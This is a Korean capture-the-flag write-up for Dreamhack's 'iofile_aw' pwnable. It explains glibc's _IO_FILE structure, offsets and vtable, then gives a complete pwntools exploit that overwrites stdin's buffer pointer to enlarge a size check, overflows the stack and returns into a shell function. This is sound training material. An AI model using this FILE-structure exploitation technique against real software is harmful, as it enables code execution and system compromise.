---
published: true
image: /img
layout: post
title: "[Dreamhack] PWN iofile_aw, what is _IO_FILE?"
excerpt: "드림핵 포너블 iofile_aw 문제풀이"
tags: [Dreamhack, pwnable, ctf, writeup, _IO_FILE]
math: true
date: 2023-02-28 17:00
---

이번 문제에서는 io_file에 대한 내용을 공부하면서 풀었다. 문제를 보면 드림핵 강의가 함께 제공된다. [https://dreamhack.io/learn/2/11#40](https://dreamhack.io/learn/2/11#40)

io_file에 대한 내용은 이번에 처음 공부해 보면서 이전 ctf에서 문제를 접했지만 해당 내용을 몰랐던 것이 매우 아쉬웠다. 그리고 생각보다 더 복잡했다...

io_file에 대해 설명하면 리눅스 시스템에서 파일 스트림을 나타내기 위한 하나의 구조체이다. fopen와 같은 파일 스트림을 여는 함수를 호출하면 내부적으로 io_file 구조체가 셋팅된다. 

glibc의 _io_file 구조체는 다음과 같다.
```c
struct _IO_FILE
{
  int _flags;		/* High-order word is _IO_MAGIC; rest is flags. */
  /* The following pointers correspond to the C++ streambuf protocol. */
  char *_IO_read_ptr;	/* Current read pointer */
  char *_IO_read_end;	/* End of get area. */
  char *_IO_read_base;	/* Start of putback+get area. */
  char *_IO_write_base;	/* Start of put area. */
  char *_IO_write_ptr;	/* Current put pointer. */
  char *_IO_write_end;	/* End of put area. */
  char *_IO_buf_base;	/* Start of reserve area. */
  char *_IO_buf_end;	/* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  char *_IO_save_base; /* Pointer to start of non-current get area. */
  char *_IO_backup_base;  /* Pointer to first valid character of backup area */
  char *_IO_save_end; /* Pointer to end of non-current get area. */
  struct _IO_marker *_markers;
  struct _IO_FILE *_chain;
  int _fileno;
  int _flags2;
  __off_t _old_offset; /* This used to be _offset but it's too small.  */
  /* 1+column number of pbase(); 0 is unknown. */
  unsigned short _cur_column;
  signed char _vtable_offset;
  char _shortbuf[1];
  _IO_lock_t *_lock;
#ifdef _IO_USE_OLD_IO_FILE
};
```

```
_flags
    파일에 대한 읽기/쓰기/추가 권한을 의미.
    0xfbad0000가 매직 값으로 이는 고정이고 하위 2바이트로 파일의 권한이 결졍된다.

_IO_read_ptr
    파일 읽기 버퍼에 대한 포인터.

_IO_read_end
    파일 읽기 버퍼 주소의 끝을 가리키는 포인터.

_IO_read_base  
    파일 읽기 버퍼 주소의 시작을 가리키는 포인터.

_IO_write_base
    파일 쓰기 버퍼 주소의 시작을 가리키는 포인터.

_IO_write_ptr
    쓰기 버퍼에 대한 포인터.

_IO_write_end
    파일 쓰기 버퍼 주소의 끝을 가리키는 포인터.

_chain
    프로세스의 _IO_FILE 구조체는 _chain 필드를 통해 링크드 리스트를 만든다.
    링크드 리스트의 헤더는 라이브러리의 전역 변수인 _IO_list_all에 저장된다.

_fileno
    파일 디스크립터의 값.
```

주로 사용되는 값들은 이 정도 같다.
_flags의 경우 0xfbad0000로 상위 2바이트가 고정이고 하위 2바이트는 파일의 형식, 읽기 또는 쓰기 권한에 따라 다르게 결정된다. glibc에 정의된 flags 값은 다음과 같다.
```c
#define _IO_MAGIC         0xFBAD0000 /* Magic number */
#define _IO_MAGIC_MASK    0xFFFF0000
#define _IO_USER_BUF          0x0001 /* Don't deallocate buffer on close. */
#define _IO_UNBUFFERED        0x0002
#define _IO_NO_READS          0x0004 /* Reading not allowed.  */
#define _IO_NO_WRITES         0x0008 /* Writing not allowed.  */
#define _IO_EOF_SEEN          0x0010
#define _IO_ERR_SEEN          0x0020
#define _IO_DELETE_DONT_CLOSE 0x0040 /* Don't call close(_fileno) on close.  */
#define _IO_LINKED            0x0080 /* In the list of all open files.  */
#define _IO_IN_BACKUP         0x0100
#define _IO_LINE_BUF          0x0200
#define _IO_TIED_PUT_GET      0x0400 /* Put and get pointer move in unison.  */
#define _IO_CURRENTLY_PUTTING 0x0800
#define _IO_IS_APPENDING      0x1000
#define _IO_IS_FILEBUF        0x2000
                           /* 0x4000  No longer used, reserved for compat.  */
#define _IO_USER_LOCK         0x8000
```
_IO_MAGIC_MASK 아래의 값들을 0xFBAD0000에 더해 권한에 대한 플레그를 설정하게 된다. 사실 다 외우기는 힘들것 같고 이번에 정리하면서 그때그때 찾아보고 해야겠다.

인터넷을 찾아보다가 다음과 같은 내용을 발견했다. _IO_FILE의 offset인데 공격코드를 작성할때 참고하면 편할 것 같다.

```
0x0   _flags
0x8   _IO_read_ptr
0x10  _IO_read_end
0x18  _IO_read_base
0x20  _IO_write_base
0x28  _IO_write_ptr
0x30  _IO_write_end
0x38  _IO_buf_base
0x40  _IO_buf_end
0x48  _IO_save_base
0x50  _IO_backup_base
0x58  _IO_save_end
0x60  _markers
0x68  _chain
0x70  _fileno
0x74  _flags2
0x78  _old_offset
0x80  _cur_column
0x82  _vtable_offset
0x83  _shortbuf
0x88  _lock
0x90  _offset
0x98  _codecvt
0xa0  _wide_data
0xa8  _freeres_list
0xb0  _freeres_buf
0xb8  __pad5
0xc0  _mode
0xc4  _unused2
0xd8  vtable
```

실제로 gdb를 통해 디버깅 해보면 _IO_FILE_plus 구조체가 호출된다. _IO_FILE_plus의 구조체는 다음과 같다.

```c
struct _IO_FILE_plus
{
  _IO_FILE file;
  const struct _IO_jump_t *vtable;
};
```
_IO_FILE은 _IO_FILE_plus의 file에 해당하고 그 아래 vtable로 할당된 _IO_JUMP_t 구조체가 있는것을 볼 수 있다. _IO_FILE + 0xd8위치에 vtable이 존재하게 된다.

_IO_JUMP_t 구조체의 내용을 다음과 같다.
```c
struct _IO_jump_t
{
    JUMP_FIELD(size_t, __dummy);
    JUMP_FIELD(size_t, __dummy2);
    JUMP_FIELD(_IO_finish_t, __finish);
    JUMP_FIELD(_IO_overflow_t, __overflow);
    JUMP_FIELD(_IO_underflow_t, __underflow);
    JUMP_FIELD(_IO_underflow_t, __uflow);
    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
    /* showmany */
    JUMP_FIELD(_IO_xsputn_t, __xsputn);
    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
    JUMP_FIELD(_IO_seekoff_t, __seekoff);
    JUMP_FIELD(_IO_seekpos_t, __seekpos);
    JUMP_FIELD(_IO_setbuf_t, __setbuf);
    JUMP_FIELD(_IO_sync_t, __sync);
    JUMP_FIELD(_IO_doallocate_t, __doallocate);
    JUMP_FIELD(_IO_read_t, __read);
    JUMP_FIELD(_IO_write_t, __write);
    JUMP_FIELD(_IO_seek_t, __seek);
    JUMP_FIELD(_IO_close_t, __close);
    JUMP_FIELD(_IO_stat_t, __stat);
    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
    JUMP_FIELD(_IO_imbue_t, __imbue);
};
```
위 필드들은 fread, fwrite, fopen같은 함수에서 호출된다. 파일 함수가 호출되면 _IO_jump_t에 있는 함수 포인터를 호출하게 된다. 우분투 16.04버전 까지는 fp_vtable.c에 버퍼 오버플로우 취약점이 존재해 _IO_jump_t vtable 값을 덮어 써 원하는 함수를 호출할 수 있다. 전역 변수에서 버퍼 오버플로우가 일어나 파일 포인터를 취약한 변수로 바꾼 후 해당 변수에 _IO_FILE를 구성해 익스플로잇 하는 시나리오가 완성된다.


이후 버전에서는 _IO_vtable_check 함수가 추가되면서 패치가 되었다.

해당 내용을 이용해 문제를 풀어보자.

문제의 소스코드는 다음과 같다.
```c
// gcc -o iofile_aw iofile_aw.c -fno-stack-protector -Wl,-z,relro,-z,now

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <string.h>

char buf[80];

int size = 512;
void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(60);
}

void read_str() {
	fgets(buf, sizeof(buf)-1, stdin);
}

void get_shell() {
	system("/bin/sh");
}

void help() {
	printf("read: Read a line from the standard input and split it into fields.\n");
}

void read_command(char *s) {
	/* No overflow here */
	int len;
	len = read(0, s, size);
	if(s[len-1] == '\x0a') 
		s[len-1] = '\0';
}

int main(int argc, char *argv[]) {
	int idx = 0;
	int sel;
	char command[512];
	long *dst = 0;
	long *src = 0;
	memset(command, 0, sizeof(command)-1);

	initialize();

	while(1) {
		printf("# ");
		read_command(command);
		
		if(!strcmp(command, "read")) {
			read_str();
		}

		else if(!strcmp(command, "help")) {
			help();
		}

		else if(!strncmp(command, "printf", 6)) {
			if ( strtok(command, " ") ) {
				src = (long *)strtok(NULL, " ");
				dst = (long *)stdin;
				if(src) 
					memcpy(dst, src, 0x40);
			}				
		}

		else if(!strcmp(command, "exit")) {
			return 0;
		}
		else {
			printf("%s: command not found\n", command);
		}
	}
	return 0;
}
```

read, help, printf, exit의 문자열을 받아 이에 맞는 동작을 하는 코드이다 사실상 read와 printf만 보면 될 것이다.


```c
else if(!strncmp(command, "printf", 6)) {
			if ( strtok(command, " ") ) {
				src = (long *)strtok(NULL, " ");
				dst = (long *)stdin;
				if(src) 
					memcpy(dst, src, 0x40);
			}				
		}
```

시나리오를 작성해보자.

위 부분을 살펴보면 입력받은 coomand 변수에 공백을 잘라서 src에 넣고 stdin 값을 dst에 넣은 다음 src 값이 존재하면 dst를 src 값으로 덮어씌우는 동작을 한다. 총 0x40만큼 덮을 수 있으며 dst는 입력을 담당하는 stdin의 위치를 가리키며 _IO_FILE 구조체가 존재하는 부분이다. 0x40만큼 오버라이트 할수 있게 되면 _IO_FILE의 buf_base까지 값을 쓸 수 있고, 이는 원하는 부분에 값을 입력 할 수 있게된다. 

이렇게 변조된 stdin을 사용하는 곳이 read가 입력되었을 때이다. read가 입력되면 read_str() 함수가 실행되는데 이 함수 내부에는 fgets 함수가 사용되어 _IO_FILE의 내용을 바탕으로 값을 쓸 수 있다.

fgets을 이용해 command 전역 변수 값의 크기를 검증하는 size변수 값을 조작할 수 있을것 같다. read_command()함수를 통해 size변수의 값 만큼만 read해 마지막 글자가 \x0a 값이면 이를 \0으로 바꾸는 동작을 한다.

printf를 통해서 stdin 구조체의 buf_base를 size 변수 주소를 넣고 read를 입력해 충분히 큰 값으로 바꾼다. 그러면 commend 변수에 값 길이를 검증하는 size 변수가 조작되어 command 변수에 오버플로우를 일으킬 수 있다. 이를 이용해 return 주소를 get_shell() 함수주소로 변경하면 익스플로잇에 성공한다.

아래 공격코드를 이용했다.

```python
from pwn import *
context.update(arch='amd64', os='linux')

p = remote("host3.dreamhack.games", 10575);
#p = process("./oneshot", env={'LD_PRELOAD':'./libc.so.6'})
#p = process("./iofile_aw")
elf=ELF('./iofile_aw')

size = elf.symbols['size']
get_shell = elf.symbols['get_shell']

'''
flag            0x00000000fbad208b
read ptr        0x00007ffff7dd1963
read end        0x00007ffff7dd1963
read base       0x00007ffff7dd1963
write base      0x00007ffff7dd1963
write ptr       0x00007ffff7dd1963
write end       0x00007ffff7dd1963
buf base        0x00007ffff7dd1963
buf end         0x00007ffff7dd1964
'''

#payload1 = p64(0xfbad208b)
payload1 = p64(0xfbad2088) #flag b -> 8
payload1 += p64(0)   #read ptr
payload1 += p64(0)   #read end
payload1 += p64(0)   #read base
payload1 += p64(0)   #write base
payload1 += p64(0)   #write ptr
payload1 += p64(0)   #write end
payload1 += p64(size)    #buf base => size ptr

p.sendafter(b"# ", b"printf "+payload1)

#print(b"printf "+payload1)
#print(b"printf\x00"+payload1)

p.sendlineafter(b"# ", b"read")
p.sendline(p64(0x500))

pause()

payload2 = b"A"*(0x228-5)
payload2 += p64(get_shell)
p.sendlineafter(b"# ", b"exit\x00"+payload2)

p.interactive()
```